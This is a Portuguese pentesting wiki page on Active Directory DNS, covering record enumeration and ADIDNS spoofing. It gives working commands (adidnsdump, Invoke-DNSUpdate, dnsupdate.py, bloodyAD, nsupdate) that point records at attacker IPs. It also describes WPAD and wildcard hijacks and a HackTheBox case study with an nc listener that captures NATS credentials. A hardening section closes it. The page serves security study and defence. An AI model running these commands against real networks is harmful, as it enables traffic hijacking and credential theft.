# Registros DNS do AD

{{#include ../../banners/hacktricks-training.md}}

Por padrão, **qualquer usuário** no Active Directory pode **enumerar todos os registros DNS** nas zonas DNS do domínio ou da floresta, de forma semelhante a uma transferência de zona (os usuários podem listar os objetos filhos de uma zona DNS em um ambiente AD).

A ferramenta [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) permite **enumerar** e **exportar** **todos os registros DNS** da zona para fins de recon de redes internas.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (abril de 2025) adiciona saída JSON/Greppable (`--json`), resolução DNS multithread e suporte a TLS 1.2/1.3 ao estabelecer conexão com LDAPS  

Para mais informações, leia [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Criar / Modificar registros (ADIDNS spoofing)

Como o grupo **Authenticated Users** tem, por padrão, a permissão **Create Child** na DACL da zona, qualquer conta de domínio (ou conta de computador) pode registrar registros adicionais. Isso pode ser usado para sequestro de tráfego, coerção de NTLM relay ou até mesmo para comprometer o domínio por completo.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py é incluído no Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Primitivas de ataque comuns

1. **Registro curinga** – `*.<zone>` transforma o servidor DNS do AD em um responder para toda a empresa, semelhante ao spoofing de LLMNR/NBNS. Pode ser abusado para capturar hashes NTLM ou retransmiti-los para LDAP/SMB.  (Requer que a pesquisa WINS esteja desabilitada.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – adicione `wpad` (ou um registro **NS** apontando para um host do atacante para contornar a Global-Query-Block-List) e faça proxy transparente das solicitações HTTP de saída para coletar credenciais. A Microsoft corrigiu os bypasses de wildcard/DNAME (CVE-2018-8320), mas os **registros NS ainda funcionam**.<sup>[[1]](#references)</sup>    
3. **Assumir o controle de uma entrada obsoleta** – reivindique o endereço IP que pertencia anteriormente a uma estação de trabalho; a entrada DNS associada ainda será resolvida, possibilitando ataques de delegação restrita baseada em recursos ou Shadow Credentials sem sequer tocar no DNS.    
4. **Spoofing DHCP → DNS** – em uma implantação padrão de Windows DHCP+DNS, um atacante não autenticado na mesma sub-rede pode sobrescrever qualquer registro A existente (incluindo Controladores de Domínio) enviando solicitações DHCP forjadas que acionam atualizações dinâmicas de DNS (Akamai “DDSpoof”, 2023). Isso possibilita um ataque machine-in-the-middle contra Kerberos/LDAP e pode levar ao takeover completo do domínio.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – altere o `dNSHostName` de uma conta de máquina que você controla, registre um registro A correspondente e solicite um certificado para esse nome a fim de se passar pelo DC. Ferramentas como **Certipy** ou **BloodyAD** automatizam todo o fluxo.  

Um registro DNS do AD com [informações de destino serializadas](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) pode fazer parte de uma cadeia de relay condicional: o solicitante precisa ter permissões para criar registros, de um caminho de coerção que faça o computador de destino se autenticar nesse nome e de um destino de relay que aceite a autenticação resultante. Avalie o protocolo de destino separadamente; a assinatura SMB na conexão recebida, por si só, não determina se um destino HTTPS WinRM aceita o relay. O nível de patch, o tratamento de nomes, o Extended Protection e a configuração do serviço podem alterar o resultado.

---

### Hijacking de serviços internos por meio de registros dinâmicos obsoletos (estudo de caso do NATS)

Quando as atualizações dinâmicas permanecem abertas a todos os usuários autenticados, **um nome de serviço desregistrado pode ser reivindicado novamente e apontado para a infraestrutura do atacante**. O DC Mirage HTB expôs o hostname `nats-svc.mirage.htb` após a limpeza de registros DNS, permitindo que qualquer usuário com poucos privilégios pudesse:<sup>[[3]](#references)</sup>

1. **Confirmar que o registro está ausente** e descobrir o SOA usando `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Recrie o registro** apontando para uma interface externa/VPN sob seu controle:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Impersonar o serviço de texto simples**. Os clientes NATS esperam receber um banner `INFO { ... }` antes de enviar as credenciais, portanto, copiar um banner legítimo do broker real é suficiente para coletar segredos:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Qualquer cliente que resolva o nome sequestrado vazará imediatamente seu frame JSON `CONNECT` (incluindo `"user"`/`"pass"`) para o listener. Executar o binário oficial `nats-server -V` no host do atacante, desativar a redação dos logs ou simplesmente farejar a sessão com o Wireshark revela as mesmas credenciais em texto simples, pois o TLS era opcional.

4. **Pivot com as credenciais capturadas** – no Mirage, a conta NATS roubada forneceu acesso ao JetStream, que expôs eventos históricos de autenticação contendo nomes de usuário/senhas reutilizáveis do AD.

Esse padrão se aplica a todo serviço integrado ao AD que dependa de handshakes TCP não seguros (APIs HTTP, RPC, MQTT etc.): assim que o registro DNS é sequestrado, o atacante se torna o serviço.
Para a enumeração do broker e o fluxo de trabalho com mensagens retidas, consulte [pentesting de NATS / JetStream](../../network-services-pentesting/4222-pentesting-nats.md).

---

## Detecção e hardening

* Negue a **Authenticated Users** o direito *Create all child objects* em zonas sensíveis e delegue as atualizações dinâmicas a uma conta dedicada usada pelo DHCP.
* Se forem necessárias atualizações dinâmicas, configure a zona como **Secure-only** e habilite **Name Protection** no DHCP para que somente o objeto de computador proprietário possa sobrescrever seu próprio registro.
* Monitore os IDs de evento do DNS Server 257/252 (atualização dinâmica), 770 (transferência de zona) e gravações LDAP em `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloqueie nomes perigosos (`wpad`, `isatap`, `*`) com um registro intencionalmente benigno ou por meio da Global Query Block List.
* Mantenha os servidores DNS corrigidos – por exemplo, as vulnerabilidades RCE CVE-2024-26224 e CVE-2024-26231 atingiram **CVSS 9.8** e podem ser exploradas remotamente contra Domain Controllers.  



## References

- [1] [ADIDNS revisitado - WPAD, GQBL e mais](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Falsificação de registros DNS por abuso das atualizações dinâmicas de DNS do DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: encadeamento de vazamentos de NFS, abuso de DNS dinâmico, roubo de credenciais NATS, segredos do JetStream e Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Entrando na zona: despejando o DNS do Active Directory usando adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
